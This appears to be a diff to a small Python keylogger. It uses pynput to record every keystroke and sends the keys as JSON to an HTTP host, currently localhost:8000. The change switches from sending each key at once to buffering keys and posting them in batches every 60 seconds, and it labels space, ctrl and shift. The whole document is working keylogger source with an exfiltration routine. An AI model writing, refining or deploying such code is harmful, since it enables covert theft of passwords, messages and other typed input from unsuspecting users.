@@ -1,25 +1,34 @@
 from pynput import keyboard
 import requests
+import time
 HOST = "http://localhost:8000"
+keyList = []
 
 def main():
-    with keyboard.Listener(
-            on_press=on_press,
+    global keyList
+    with keyboard.Listener(on_press=on_press,
             #on_release=on_release,
             ) as listener:
+        while True:
+            time.sleep(60)
+            #print(keyList)
+            posting(HOST, keyList)
+            keyList = []
         listener.join()
-    
+        
+
 def on_press(key):
     try:
-        print(key.char, end="", flush=True)
-        posting(HOST, key.char)
+        keyList.append(key.char)
     except AttributeError:
         if key == keyboard.Key.space:
-            print(' ', end="", flush=True)
+            keyList.append(" ")
+        elif key == keyboard.Key.ctrl_l:
+            keyList.append("ctrl")
+        elif key == keyboard.Key.shift:
+            keyList.append("shift")
         else:
-            print('')
-            print(key, flush=True)
-        posting(HOST, str(key))
+            keyList.append(str(key))
 
 def posting(host, value):
     requests.post(host, json={"key": value})
